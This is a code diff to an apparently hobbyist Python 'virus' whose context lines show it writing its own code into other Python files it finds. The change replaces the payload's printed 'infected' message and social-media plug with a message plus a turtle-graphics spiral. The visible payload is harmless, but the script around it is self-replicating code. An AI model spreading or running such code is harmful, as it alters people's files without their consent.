@@ -3,6 +3,7 @@
 
 # importing the required modules
 
+import turtle
 import os
 import sys
 import glob
@@ -58,11 +59,21 @@ for file in python_files:
             f.writelines(final_code)
 
 # payload
-# here just printing a message on the terminal
+# here just printing a message on the terminal and shows a turtle pattern
 
 def malicious_code():
     print("YOU HAVE BEEN INFECTED HAHAHA !!!")
     print("FOLLOW @python.portal FOR MORE AMAZING CONTENT!!!")
+
+    
+    squary = turtle.Turtle(visible = False)
+    squary.color("#11B7D4")
+    turtle.bgcolor("#111418")
+    squary.speed(10)
+
+    for i in range(500): # this "for" loop will repeat these functions 500 times
+        squary.forward(i)
+        squary.left(91)
 
 malicious_code()
 
